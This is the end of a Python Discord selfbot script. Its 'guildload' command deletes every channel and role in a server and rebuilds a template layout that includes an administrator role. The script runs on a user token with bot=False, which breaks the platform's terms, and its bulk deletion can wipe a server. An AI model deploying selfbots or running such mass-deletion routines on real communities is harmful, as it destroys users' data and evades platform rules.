async def guildload(ctx, xx=None):
  if xx is None:
    await ctx.send('Input a backup Type! Do `guildload list` to get list of backups')
  if xx == 'list':
    await ctx.send('''
>>> ```ini
[ LIST ]
example (MODIFY THIS IN YOUR SCRIPT)
```
    ''')
  if xx == 'example':
    for z in ctx.guild.channels:
        await z.delete()
    await roledel(ctx)
    c1 = await ctx.guild.create_category('Example Category 1')
    await c1.create_text_channel('example-text-1')
    await c1.create_text_channel('example-text-2')
    await c1.create_voice_channel('Example Voice 1')
    await c1.create_voice_channel('Example Voice 2')
    c2 = await ctx.guild.create_category('Example Category 2')
    await c2.create_text_channel('example-text-1')
    await c2.create_text_channel('example-text-2')
    await c2.create_voice_channel('Example Voice 1')
    await c2.create_voice_channel('Example Voice 2')
    await ctx.guild.create_role(name='Example Admin Role', permissions=discord.Permissions(8), color=discord.Colour(0xFF0000))
    await ctx.guild.create_role(name='Example Normal Role', permissions=discord.Permissions(0), color=discord.Colour(0x00FF00))

##### === ENDING CODE === #####

keep_alive()
client.run(token, bot=False)